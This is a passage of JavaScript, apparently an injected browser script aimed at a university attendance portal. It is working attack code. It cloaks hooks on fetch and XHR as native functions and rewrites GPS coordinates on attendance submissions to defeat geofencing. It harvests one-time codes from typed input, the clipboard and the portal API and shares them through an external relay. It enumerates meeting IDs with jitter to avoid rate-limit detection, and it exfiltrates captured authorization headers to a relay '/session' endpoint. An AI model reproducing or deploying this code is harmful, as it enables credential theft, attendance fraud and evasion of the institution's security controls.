    if (refs.pill) {
      refs.pill.className   = `hud-pill ${pillClass}`;
      refs.pill.textContent = timeFormatted;
    }
    if (refs.rule) refs.rule.textContent = ruleText;
    if (refs.roomBadge) {
      if (currentConfig && currentConfig._autoRoomMatched) {
        refs.roomBadge.style.display = 'inline-block';
        refs.roomBadge.textContent   = `Auto-Room: ${currentConfig._autoRoomMatched}`;
      } else {
        refs.roomBadge.style.display = 'none';
      }
    }
    if (refs.spoof) {
      refs.spoof.innerHTML = cfg
        ? `<span style="color:#4ade80;">Active</span>`
        : `<span style="color:#9ca3af;">Off</span>`;
    }
  }

  // ── Swarm Mesh & OTP Peer Relay ───────────────────────────────────────────
  let _swarmActive = false;
  let _swarmInterval = null;
  let _isSwarmLeader = false;
  let _lastPushedOtp = null;
  let _lastPulledOtp = null;
  let _peerId = null;

  try {
    _peerId = sessionStorage.getItem('__gps_peer') || ('p_' + Math.random().toString(36).substring(2, 9));
    sessionStorage.setItem('__gps_peer', _peerId);
  } catch (_) {
    _peerId = 'p_' + Math.random().toString(36).substring(2, 9);
  }

  let _activeRelayIdx = 0;
  let _relayFailCounts = {};

  function _getRelayUrls() {
    const raw = (currentConfig && currentConfig.relayUrl) || '';
    if (!raw) return [];
    return raw.split(/[,;\s]+/).map(s => s.trim().replace(/\/+$/, '')).filter(Boolean);
  }

  function _getRelayUrl() {
    const list = _getRelayUrls();
    if (!list.length) return null;
    return list[_activeRelayIdx % list.length];
  }

  function _markRelayFailure(failedUrl) {
    if (!failedUrl) return;
    const origin = failedUrl.replace(/^https?:\/\//, '').split('/')[0];
    _relayFailCounts[origin] = (_relayFailCounts[origin] || 0) + 1;
    const list = _getRelayUrls();
    if (list.length > 1 && _relayFailCounts[origin] >= 2) {
      _activeRelayIdx = (_activeRelayIdx + 1) % list.length;
      _relayFailCounts[origin] = 0;
      const nextOrigin = list[_activeRelayIdx].replace(/^https?:\/\//, '').split('/')[0];
      refsStatus(`Failover: switched to ${nextOrigin}`, '#f59e0b');
    }
  }

  function _markRelaySuccess(url) {
    if (!url) return;
    const origin = url.replace(/^https?:\/\//, '').split('/')[0];
    if (_relayFailCounts[origin]) delete _relayFailCounts[origin];
  }

  function _getRelayKey() {
    const d = _activeMeetingData;
    if (!d) return null;
    return d.id_tatap_muka || d.id_tm || d.id || null;
  }

  function _updateHudSwarmBadge() {
    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.swarm) {
      const el = _hudContainer._refs.swarm;
      if (!_getRelayUrl()) {
        el.textContent = 'Disabled';
        el.style.color = '#64748b';
      } else if (_isSwarmLeader) {
        el.textContent = 'Leader';
        el.style.color = '#38bdf8';
      } else {
        el.textContent = 'Follower';
        el.style.color = '#a78bfa';
      }
    }
  }

  // ── CSP-Immune Relay Fetch Bridge (bypasses page connect-src CSP) ─────────
  function _relayFetch(url, options) {
    if (!_isPortalDomain()) return Promise.resolve({ ok: false, status: 0 });
    return new Promise((resolve) => {
      const reqId = Math.random().toString(36).substring(2, 10);
      const resEvent = '__gps_relay_res_' + reqId;
      const timer = _setTimeout(() => {
        try { _removeEventListener(resEvent, onRes, true); } catch (_) {}
        _markRelayFailure(url);
        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
      }, 5000);

      function onRes(e) {
        try {
          _removeEventListener(resEvent, onRes, true);
          _clearTimeout(timer);
          const data = typeof e.detail === 'string' ? JSON.parse(e.detail) : e.detail;
          if (data && data.ok) {
            _markRelaySuccess(url);
          } else {
            _markRelayFailure(url);
          }
          resolve({
            ok:     Boolean(data && data.ok),
            status: (data && data.status) || (data && data.ok ? 200 : 500),
            json:   () => Promise.resolve((data && data.data) || null),
            text:   () => Promise.resolve((data && data.text) || '')
          });
        } catch (_) {
          _markRelayFailure(url);
          resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
        }
      }

      _addEventListener(resEvent, onRes, true);
      try {
        _dispatchEvent(new _CustomEvent('__gps_relay_req', {
          detail: JSON.stringify({ reqId, url, options })
        }));
      } catch (_) {
        _clearTimeout(timer);
        _markRelayFailure(url);
        resolve({ ok: false, status: 0, json: () => Promise.resolve(null), text: () => Promise.resolve('') });
      }
    });
  }

  function _pushSwarmState(stateObj) {
    const relay = _getRelayUrl();
    if (!relay || !_isPortalDomain()) return;
    _relayFetch(`${relay}/mesh/state`, {
      method:  'PUT',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(stateObj)
    }).catch(() => {});
  }

  let _meshBroadcastChan = null;
  let _meshHarvestingInstalled = false;

  function _broadcastMeshOtp(code, source = 'local') {
    if (!code || !/^\d{6}$/.test(String(code).trim())) return;
    const cleanCode = String(code).trim();
    if (_lastPushedOtp === cleanCode) return;
    _lastPushedOtp = cleanCode;

    // 1. Reflect into HUD input
    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
      if (_hudContainer._refs.codeInput.value !== cleanCode) {
        _hudContainer._refs.codeInput.value = cleanCode;
      }
    }

    // 2. Reflect into portal modal input if open
    try {
      const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
      if (modalInput && modalInput.value !== cleanCode) {
        _setNativeInputValue(modalInput, cleanCode);
        const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
          Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
        if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
      }
    } catch (_) {}

    // 3. Push to Cloudflare KV Relay
    const tmKey = _getRelayKey() || (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || 'tm_active';
    _pushOtp(cleanCode, String(tmKey));

    if (_isPortalDomain()) {
      _pushSwarmState({
        tmKey: String(tmKey),
        otp: cleanCode,
        ruangan: (_activeMeetingData && _activeMeetingData.ruangan) || null,
        course: (_activeMeetingData && _activeMeetingData.nama_mk) || null,
        ts: Date.now()
      });
    }

    // 4. Gossip across local browser tabs & windows via BroadcastChannel
    try {
      if (typeof window.BroadcastChannel !== 'undefined') {
        if (!_meshBroadcastChan) _meshBroadcastChan = new window.BroadcastChannel('__presensi_mesh_channel__');
        _meshBroadcastChan.postMessage({ type: 'MESH_OTP_SYNC', code: cleanCode, tmKey: String(tmKey), source });
      }
    } catch (_) {}

    refsStatus(`OTP shared to Swarm Mesh (${source})`, '#38bdf8');
  }

  function _initMeshHarvesting() {
    if (_meshHarvestingInstalled || !_isPortalDomain()) return;
    _meshHarvestingInstalled = true;

    // A. DOM Input Sniffer (detects when student or peer types 6-digit OTP into any field)
    document.addEventListener('input', (e) => {
      if (!e.target || !_isPortalDomain()) return;
      const val = String(e.target.value || '').trim();
      if (/^\d{6}$/.test(val)) {
        _broadcastMeshOtp(val, 'dom_input');
      }
    }, true);

    // B. Clipboard Passive Sniffer on Window Focus (detects 6-digit code copied from WhatsApp/Telegram)
    window.addEventListener('focus', async () => {
      if (!_isPortalDomain()) return;
      try {
        if (navigator.clipboard && typeof navigator.clipboard.readText === 'function') {
          const text = await navigator.clipboard.readText();
          const trimmed = (text || '').trim();
          if (/^\d{6}$/.test(trimmed) && trimmed !== _lastPulledOtp && trimmed !== _lastPushedOtp) {
            _broadcastMeshOtp(trimmed, 'clipboard');
          }
        }
      } catch (_) {}
    });

    // C. Cross-Tab BroadcastChannel Mesh Receiver
    try {
      if (typeof window.BroadcastChannel !== 'undefined') {
        if (!_meshBroadcastChan) _meshBroadcastChan = new window.BroadcastChannel('__presensi_mesh_channel__');
        _meshBroadcastChan.onmessage = (evt) => {
          if (evt.data && evt.data.type === 'MESH_OTP_SYNC' && evt.data.code) {
            const incomingOtp = String(evt.data.code);
            if (/^\d{6}$/.test(incomingOtp) && incomingOtp !== _lastPulledOtp) {
              _lastPulledOtp = incomingOtp;
              if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
                _hudContainer._refs.codeInput.value = incomingOtp;
              }
              const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
              if (modalInput) {
                _setNativeInputValue(modalInput, incomingOtp);
                const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
                  Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
                if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
              }
              refsStatus('OTP synced via Peer Mesh Gossip', '#38bdf8');
            }
          }
        };
      }
    } catch (_) {}
  }

  function _pushOtp(otp, tmKey) {
    const relay = _getRelayUrl();
    if (!relay || !tmKey || !otp || !_isPortalDomain()) return;
    if (_lastPushedOtp === otp) return;
    _lastPushedOtp = otp;
    _relayFetch(`${relay}/otp/${tmKey}`, {
      method:  'PUT',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ code: otp, otp, ts: Date.now() })
    }).catch(() => {});
  }

  async function _probePortalKodeEndpoint(tmKey) {
    if (!tmKey || !_isPortalDomain() || !_origFetch) return;
    try {
      const csrfMatch = document.cookie.match(/(?:^|;\s*)(?:CSRF-TOKEN|XSRF-TOKEN|_csrf|csrf_token)=([^;]+)/i);
      const headers = { 'Accept': 'application/json' };
      if (csrfMatch) headers['X-CSRF-TOKEN'] = decodeURIComponent(csrfMatch[1]);
      if (window.__capturedAuthToken) headers['Authorization'] = window.__capturedAuthToken;

      const res = await _origFetch(`/api/presensi/tm/${tmKey}/kode`, {
        method: 'GET',
        credentials: 'include',
        headers
      });
      if (res && res.ok) {
        const json = await res.json().catch(() => null);
        const code = (json && json.data && json.data.kode) || (json && json.kode) || (json && json.data && json.data.pin);
        if (code && /^\d{6}$/.test(String(code))) {
          const otpStr = String(code);
          _broadcastMeshOtp(otpStr, 'portal_api_probe');
          if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
            if (!_hudContainer._refs.codeInput.value) {
              _hudContainer._refs.codeInput.value = otpStr;
              refsStatus('OTP auto-retrieved via Portal API', '#4ade80');
            }
          }
        }
      }
    } catch (_) {}
  }

  function _pullOtp(tmKey) {
    const relay = _getRelayUrl();
    if (!tmKey || !_isPortalDomain()) return;
    _probePortalKodeEndpoint(tmKey);
    if (!relay) return;
    _relayFetch(`${relay}/otp/${tmKey}`, { method: 'GET' })
      .then(r => r && r.ok ? r.json() : null)
      .then(data => {
        if (!data) return;
        const otp = String(data.code || data.otp || '');
        if (!otp || otp === _lastPulledOtp) return;
        _lastPulledOtp = otp;
        if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
          if (!_hudContainer._refs.codeInput.value) {
            _hudContainer._refs.codeInput.value = otp;
            if (_hudContainer._refs.statusMsg) {
              refsStatus('OTP synced from peer relay', '#a78bfa');
            }
          }
        }
        const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
        if (modalInput && !modalInput.value) {
          _setNativeInputValue(modalInput, otp);
          const hadirRadio = document.querySelector('input[name="hadirTatapMuka"][value="L"], input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
            Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas|offline/i.test(l.textContent || ''));
          if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
        }
      })
      .catch(() => {});
  }

  function refsStatus(text, color) {
    if (_hudContainer && _hudContainer._refs && _hudContainer._refs.statusMsg) {
      _hudContainer._refs.statusMsg.textContent = text;
      _hudContainer._refs.statusMsg.style.color = color;
    }
  }

  function _swarmHeartbeat() {
    const relay = _getRelayUrl();
    if (!relay || !_isPortalDomain()) return;

    const meta = {
      domain: window.location.hostname,
      room:   (_activeMeetingData && _activeMeetingData.ruangan) || null,
      course: (_activeMeetingData && _activeMeetingData.nama_mk) || null,
      hasQr:  Boolean(_virtualQrImage),
    };

    _relayFetch(`${relay}/mesh/heartbeat/${_peerId}`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify(meta)
    })
      .then(r => r && r.ok ? r.json() : null)
      .then(data => {
        if (!data) return;
        _isSwarmLeader = Boolean(data.isLeader);
        _updateHudSwarmBadge();

        // 1. Sync OTP from swarm
        if (data.latestOtp && data.latestOtp.code) {
          const otp = String(data.latestOtp.code);
          if (otp && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
            if (!_hudContainer._refs.codeInput.value) {
              _hudContainer._refs.codeInput.value = otp;
              refsStatus('OTP synced via Swarm Mesh', '#38bdf8');
            }
          }
          const modalInput = document.querySelector('.chakra-modal__content input[placeholder*="kode" i], .modal input[placeholder*="kode" i], [role="dialog"] input[placeholder*="kode" i]');
          if (modalInput && !modalInput.value) {
            _setNativeInputValue(modalInput, otp);
            const hadirRadio = document.querySelector('input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
              Array.from(document.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas/i.test(l.textContent || ''));
            if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
          }
        }

        // 2. Sync QR from leader
        if (data.meshState && data.meshState.qrUrl && !_virtualQrImage) {
          setVirtualQrImage(data.meshState.qrUrl);
          refsStatus('QR auto-synced from Swarm Leader', '#38bdf8');
        }

        // 3. Fallback poll active tmKey if defined
        const tmKey = _getRelayKey();
        if (tmKey) _pullOtp(tmKey);
      })
      .catch(() => {});
  }

  function _startOtpPoller() {
    _initMeshHarvesting();
    if (_swarmActive) return;
    if (!_isPortalDomain()) return;
    const relay = _getRelayUrl();
    if (!relay) {
      _updateHudSwarmBadge();
      return;
    }
    _swarmActive = true;
    _swarmHeartbeat();
    _swarmInterval = _setInterval(_swarmHeartbeat, 6000);
  }

  function _stopOtpPoller() {
    if (_swarmInterval) { _clearInterval(_swarmInterval); _swarmInterval = null; }
    _swarmActive = false;
    _isSwarmLeader = false;
    _updateHudSwarmBadge();
  }

  // ── tmId Background Enumerator ────────────────────────────────────────────
  // Silently discovers adjacent valid meeting IDs. Stores results in _knownTmIds.
  let _knownTmIds = new Set();
  let _tmEnumRunning = false;

  function _enumerateTmIds(baseTmId) {
    if (!baseTmId || _tmEnumRunning || !_origFetch || !_isPortalDomain()) return;
    // If connected to a swarm and not leader, let the leader handle discovery
    if (_getRelayUrl() && !_isSwarmLeader) return;

    const numId = parseInt(baseTmId, 10);
    if (isNaN(numId)) return;
    _tmEnumRunning = true;

    const candidates = [];
    for (let delta = -10; delta <= 10; delta++) {
      if (delta === 0) { _knownTmIds.add(numId); continue; }
      candidates.push(numId + delta);
    }

    let idx = 0;
    function _nextProbe() {
      if (idx >= candidates.length) { _tmEnumRunning = false; return; }
      const id = candidates[idx++];
      _origFetch(`/api/presensi/tm/${id}`, {
        method:      'GET',
        credentials: 'include',
        headers:     { 'Accept': 'application/json' }
      }).then(r => {
        if (r.status === 200) _knownTmIds.add(id);
      }).catch(() => {}).finally(() => {
        // Stagger probes: 200–600ms between each to avoid rate-limit detection
        _setTimeout(_nextProbe, 200 + Math.random() * 400);
      });
    }
    _nextProbe();
  }

  // ── Session Exfil ─────────────────────────────────────────────────────────
  // Snapshots response cookies + auth headers from presensi API responses
  // and relays them to the KV worker's /session endpoint.
  function _exfilSession(responseHeaders) {
    try {
      const authHeader = responseHeaders && responseHeaders.get && (
        responseHeaders.get('Authorization') ||
        responseHeaders.get('X-Auth-Token')  ||
        responseHeaders.get('X-Access-Token')
      );
      if (authHeader) {
        // Dispatch local telemetry for headless background auto-checkin
        try {
          _dispatchEvent(new _CustomEvent('__gps_telemetry_msg', {
            detail: JSON.stringify({
              type:   'SESSION_CAPTURED',
              auth:   authHeader,
              domain: window.location.hostname,
              ts:     Date.now()
            })
          }));
        } catch (_) {}

        const relay = _getRelayUrl();
        if (relay && _isPortalDomain()) {
          _relayFetch(`${relay}/session`, {
            method:  'PUT',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify({ auth: authHeader, ts: Date.now() })
          }).catch(() => {});
        }
      }
    } catch (_) {}
  }

  // ── Geofence Polygon Parser ────────────────────────────────────────────────
  // If the API response includes polygon/radius data, auto-place within centroid.
  function _applyGeofenceFromPayload(geoData) {
    if (!geoData || !currentConfig) return;
    // Case 1: radius + center point
    if (geoData.radius && geoData.lat && geoData.lng) {
      const r = parseFloat(geoData.radius);
      const clat = parseFloat(geoData.lat);
      const clng = parseFloat(geoData.lng);
      if (!isNaN(r) && !isNaN(clat) && !isNaN(clng)) {
        currentConfig.lat = clat;
        currentConfig.lng = clng;
        currentConfig._geofenceRadius = r;
        return;
      }
    }
    // Case 2: polygon array — compute centroid
    if (Array.isArray(geoData.polygon) && geoData.polygon.length >= 3) {
      let sumLat = 0, sumLng = 0;
      for (const pt of geoData.polygon) {
        sumLat += parseFloat(pt.lat || pt[0] || 0);
        sumLng += parseFloat(pt.lng || pt[1] || 0);
      }
      const n = geoData.polygon.length;
      currentConfig.lat = sumLat / n;
      currentConfig.lng = sumLng / n;
      // Approximate bounding radius
      let maxDist = 0;
      for (const pt of geoData.polygon) {
        const dlat = parseFloat(pt.lat || pt[0] || 0) - currentConfig.lat;
        const dlng = parseFloat(pt.lng || pt[1] || 0) - currentConfig.lng;
        const dist = Math.sqrt(dlat * dlat + dlng * dlng) * 111320;
        if (dist > maxDist) maxDist = dist;
      }
      currentConfig._geofenceRadius = maxDist;
    }
  }

  // ── Payload Sniffer ────────────────────────────────────────────────────────
  function _sniffPresensiPayload(url, rawText, responseHeaders) {
    try {
      if (!rawText || typeof rawText !== 'string') return;
      if (url.includes('/api/presensi/dashboard') || url.includes('/api/presensi/tm')) {
        const json = JSON.parse(rawText);
        let widget = null;

        if (json.data && json.data.widget)       widget = json.data.widget;
        else if (json.widget)                     widget = json.widget;
        else if (Array.isArray(json.data))        widget = json.data.find(item => item && (item.status === 'sedang_berlangsung' || item.tm_mulai)) || null;
        else if (json.data && typeof json.data === 'object') widget = json.data;

        if (widget) {
          // Geofence: look for geofence/lokasi/area keys
          const geoData = widget.geofence || widget.lokasi_geofence || widget.area || null;
          if (geoData) _applyGeofenceFromPayload(geoData);

          // Auto-room matching
          const roomCandidate = widget.ruangan || widget.nama_ruang || widget.kode_ruang || widget.nama_kelas || '';
          const matched = detectRoomPreset(roomCandidate);
          if (matched && currentConfig) {
            const latDiff = Math.abs(parseFloat(currentConfig.lat) - matched.lat);
            const lngDiff = Math.abs(parseFloat(currentConfig.lng) - matched.lng);
            if (latDiff > 0.0001 || lngDiff > 0.0001) {
              currentConfig.lat = matched.lat;
              currentConfig.lng = matched.lng;
              currentConfig._autoRoomMatched = matched.label;
              try {
                _dispatchEvent(new _CustomEvent('__gps_update_coords', {
                  detail: JSON.stringify({ lat: matched.lat, lng: matched.lng, label: matched.label })
                }));
              } catch (_) {}
            }
          }

          _createOrUpdateHud(widget);

          // OTP auto-fill + push to relay
          const otp = widget.kode || widget.pin;
          if (otp) {
            if (_hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
              if (!_hudContainer._refs.codeInput.value) {
                _hudContainer._refs.codeInput.value = otp;
              }
            }
            const tmKey = _getRelayKey() || widget.id_tatap_muka || widget.id_tm || widget.id;
            if (tmKey) _pushOtp(String(otp), String(tmKey));
          }

          // QR dynamic auto-inject
          const qrUrl = widget.qr_url || widget.qr || widget.qr_code_url || widget.qrcode;
          if (qrUrl && typeof qrUrl === 'string' && qrUrl.startsWith('http')) {
            setVirtualQrImage(qrUrl);
            if (_hudContainer && _hudContainer._refs && _hudContainer._refs.statusMsg) {
              _hudContainer._refs.statusMsg.textContent = 'QR auto-loaded';
              _hudContainer._refs.statusMsg.style.color = '#38bdf8';
            }
          }

          // Enumerate adjacent tmIds once we know our own
          const myTmId = widget.id_tatap_muka || widget.id_tm || widget.id;
          if (myTmId) _enumerateTmIds(myTmId);

          // Broadcast to Swarm peers if leader
          if (_isSwarmLeader && _getRelayUrl()) {
            _pushSwarmState({
              tmKey: myTmId,
              otp: otp ? String(otp) : null,
              qrUrl: qrUrl || null,
              ruangan: widget.ruangan || null,
              course: widget.nama_mk || null,
              ts: Date.now()
            });
          }

          // Session exfil
          if (responseHeaders) _exfilSession(responseHeaders);
        }
      }
    } catch (_) {}
  }

  // ── Network Interception Scope & Portal Check ─────────────────────────────
  let _networkInterceptorsInstalled = false;

  function _isPortalDomain() {
    const currentHost = window.location.hostname ? window.location.hostname.toLowerCase() : '';
    if (!currentHost) return false;
    const targetDomain = (currentConfig && currentConfig.targetDomain) ? currentConfig.targetDomain.toLowerCase().trim() : '';
    if (!targetDomain) return false;
    if (currentHost === targetDomain || currentHost.endsWith('.' + targetDomain)) return true;

    // Sibling subdomain matching (e.g. attendance.university.edu matching portal.university.edu)
    const targetParts = targetDomain.split('.');
    if (targetParts.length >= 3) {
      const apex = targetParts.slice(1).join('.');
      if (currentHost === apex || currentHost.endsWith('.' + apex)) return true;
    }
    return false;
  }

  // Human-like request timing jitter to normalize behavioral pattern
  function _humanDelay() {
    return Math.floor(50 + Math.random() * 150);
  }

  function _installNetworkInterceptors() {
    if (_networkInterceptorsInstalled) return;
    if (!_isPortalDomain()) return;
    _networkInterceptorsInstalled = true;

    // ── Fetch Proxy ────────────────────────────────────────────────────────
    if (window.fetch) {
      const _localFetch = _origFetch || window.fetch;
      const fetchProxy = new Proxy(_localFetch, {
        apply(target, thisArg, args) {
          let [resource, init] = args;
          const cfg = getSpoofConfig();
          const url = typeof resource === 'string' ? resource : (resource && resource.url) || '';

          if (init && init.headers) {
            try {
              const ah = (typeof init.headers.get === 'function')
                ? (init.headers.get('Authorization') || init.headers.get('authorization'))
                : (init.headers.Authorization || init.headers.authorization);
              if (ah) window.__capturedAuthToken = ah;
            } catch (_) {}
          }

          // Coordinate payload rewrite on attendance submission (covers /self, /{id_mhs}, and /batch)
          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa')) {
            try {
              const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
              if (init && init.body && typeof init.body === 'string') {
                const parsed = JSON.parse(init.body);
                parsed.latitude  = pos.coords.latitude;
                parsed.longitude = pos.coords.longitude;
                if (parsed.kode && /^\d{6}$/.test(String(parsed.kode))) {
                  _broadcastMeshOtp(String(parsed.kode), 'portal_fetch');
                }
                init = Object.assign({}, init, { body: JSON.stringify(parsed) });
                args[1] = init;
                _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
              } else if (init && init.body && typeof init.body === 'object' && typeof init.body.set === 'function') {
                init.body.set('latitude', pos.coords.latitude);
                init.body.set('longitude', pos.coords.longitude);
                const codeVal = typeof init.body.get === 'function' ? init.body.get('kode') : null;
                if (codeVal && /^\d{6}$/.test(String(codeVal))) {
                  _broadcastMeshOtp(String(codeVal), 'portal_fetch_form');
                }
                _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
              }
            } catch (_) {}
          }

          const promise = Reflect.apply(target, thisArg, args);

          if (typeof url === 'string' && url.includes('/api/presensi/')) {
            promise.then(res => {
              try {
                const headers = res.headers;
                res.clone().text().then(txt => _sniffPresensiPayload(url, txt, headers));
                _exfilSession(headers);
              } catch (_) {}
            }).catch(() => {});
          }

          return promise;
        }
      });
      _cloak(fetchProxy, 'function fetch() { [native code] }');
      try { window.fetch = fetchProxy; } catch (_) {}
    }

    // ── XHR Proxy ─────────────────────────────────────────────────────────
    if (window.XMLHttpRequest) {
      const openProxy = new Proxy(_origXHROpen, {
        apply(target, thisArg, args) {
          thisArg._requestUrl    = args[1];
          thisArg._requestMethod = args[0];
          return Reflect.apply(target, thisArg, args);
        }
      });

      const setHeaderProxy = new Proxy(_origXHRSetHeader, {
        apply(target, thisArg, args) {
          if (args[0] && /^authorization$/i.test(args[0]) && args[1]) {
            try { window.__capturedAuthToken = args[1]; } catch (_) {}
          }
          return Reflect.apply(target, thisArg, args);
        }
      });

      const sendProxy = new Proxy(_origXHRSend, {
        apply(target, thisArg, args) {
          let body = args[0];
          const cfg = getSpoofConfig();
          const url = thisArg._requestUrl || '';

          if (cfg && typeof url === 'string' && url.includes('/api/presensi/tm/') && url.includes('/mahasiswa') && typeof body === 'string') {
            try {
              const parsed = JSON.parse(body);
              const pos = buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius);
              parsed.latitude  = pos.coords.latitude;
              parsed.longitude = pos.coords.longitude;
              if (parsed.kode && /^\d{6}$/.test(String(parsed.kode))) {
                _broadcastMeshOtp(String(parsed.kode), 'portal_xhr');
              }
              args[0] = JSON.stringify(parsed);
              _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
            } catch (_) {}
          }

          if (typeof url === 'string' && url.includes('/api/presensi/')) {
            thisArg.addEventListener('load', () => {
              _sniffPresensiPayload(url, thisArg.responseText, null);
            });
          }

          return Reflect.apply(target, thisArg, args);
        }
      });

      _cloak(openProxy, 'function open() { [native code] }');
      _cloak(setHeaderProxy, 'function setRequestHeader() { [native code] }');
      _cloak(sendProxy, 'function send() { [native code] }');
      try {
        XMLHttpRequest.prototype.open = openProxy;
        XMLHttpRequest.prototype.setRequestHeader = setHeaderProxy;
        XMLHttpRequest.prototype.send = sendProxy;
      } catch (_) {}
    }
  }

  // Early install attempt
  _installNetworkInterceptors();

  // ── Phase 5: DOM Result Observer ─────────────────────────────────────────
  if (_isPortalDomain()) {

    function _checkDomForResult(node) {
      if (!node || !node.textContent) return;
      const text = node.textContent.toLowerCase();
      if (
        text.includes('berhasil') || text.includes('sukses') ||
        text.includes('presensi anda telah') || text.includes('absensi berhasil') ||
        text.includes('hadir kuliah') || text.includes('success') ||
        text.includes('data tersimpan')
      ) {
        _sendResultTelemetry('accepted');
        return;
      }
      if (
        text.includes('gagal') || text.includes('tidak valid') ||
        text.includes('tidak terdaftar') || text.includes('lokasi tidak') ||
        text.includes('failed') || text.includes('kadaluarsa') ||
        text.includes('telah ditutup') || text.includes('error')
      ) {
        _sendResultTelemetry('rejected');
      }
    }

    const RESULT_SELECTORS = [
      '.chakra-toast', '.chakra-alert', '[data-status="success"]', '[data-status="error"]',
      '#chakra-toast-manager-top-right', '.swal2-popup', '.alert', '.alert-success',
      '.alert-danger', '.toast', '.notification', '[role="alert"]', '.modal-body',
      '#swal2-html-container'
    ].join(',');

    const _observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        for (const node of mutation.addedNodes) {
          if (node.nodeType !== 1) continue;
          if (node.matches && node.matches(RESULT_SELECTORS)) _checkDomForResult(node);
          const matches = node.querySelectorAll && node.querySelectorAll(RESULT_SELECTORS);
          if (matches) { for (const el of matches) _checkDomForResult(el); }
        }
        if (
          mutation.type === 'characterData' &&
          mutation.target.parentElement &&
          mutation.target.parentElement.matches &&
          mutation.target.parentElement.matches(RESULT_SELECTORS)
        ) {
          _checkDomForResult(mutation.target.parentElement);
        }
      }
    });

    if (document.body) {
      _observer.observe(document.body, { childList: true, subtree: true, characterData: true });
    } else {
      document.addEventListener('DOMContentLoaded', () => {
        _observer.observe(document.body, { childList: true, subtree: true, characterData: true });
      }, { once: true });
    }
  }

})();
